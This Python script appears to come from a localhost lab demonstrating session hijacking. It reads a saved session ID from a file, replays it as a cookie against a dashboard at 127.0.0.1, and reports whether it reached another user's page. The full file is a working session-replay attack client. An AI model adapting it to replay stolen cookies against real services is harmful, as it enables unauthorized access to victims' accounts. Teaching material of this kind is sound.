import requests
import os

# Server settings
SERVER_URL = "http://127.0.0.1:8000"
SESSION_COOKIE_FILE = "session_cookie.txt"  # Cookie file saved by the login client

def perform_session_hijack():
    print("--- Attempting Session Hijack ---")

    # 1. Read the session cookie from the file
    if not os.path.exists(SESSION_COOKIE_FILE):
        print(f"Error: Session cookie file '{SESSION_COOKIE_FILE}' not found.")
        print("Please run 'login_client.py' first to generate the cookie file.")
        return

    session_id = None
    try:
        with open(SESSION_COOKIE_FILE, 'r') as f:
            session_id = f.read().strip()
        if not session_id:
            print(f"Error: Session ID not found in '{SESSION_COOKIE_FILE}'. File might be empty.")
            return
        print(f"Successfully read session ID from file: {session_id}")
    except Exception as e:
        print(f"An error occurred while reading the session cookie file: {e}")
        return

    # 2. Send a request using the read session ID
    hijacked_session = requests.Session()
    # Manually set the cookie to RequestsCookieJar
    hijacked_session.cookies.set('session_id', session_id, domain='127.0.0.1', path='/')

    dashboard_url = f"{SERVER_URL}/dashboard"
    print(f"Accessing dashboard with hijacked session ID: {session_id}")

    try:
        response = hijacked_session.get(dashboard_url)
        print(f"Hijacked session access status: {response.status_code}")
        print(f"Hijacked session content:\n{response.text.strip()}")

        if response.status_code == 200 and "Welcome, testuser!" in response.text:
            print("\n--- Session Hijack SUCCESSFUL! ---")
            print("Successfully accessed the dashboard using the hijacked session ID.")
            print("The attacker has gained access to 'testuser's confidential information.")
        else:
            print("\n--- Session Hijack FAILED or Unexpected Content ---")
            print("Could not access the dashboard with the hijacked session ID, or content was not as expected.")
    except requests.exceptions.ConnectionError:
        print(f"Error: Could not connect to the server at {SERVER_URL}. Is the server running?")
    except Exception as e:
        print(f"An unexpected error occurred during session hijack attempt: {e}")

if __name__ == "__main__":
    perform_session_hijack()
    print("\nAttack Client operations completed.")
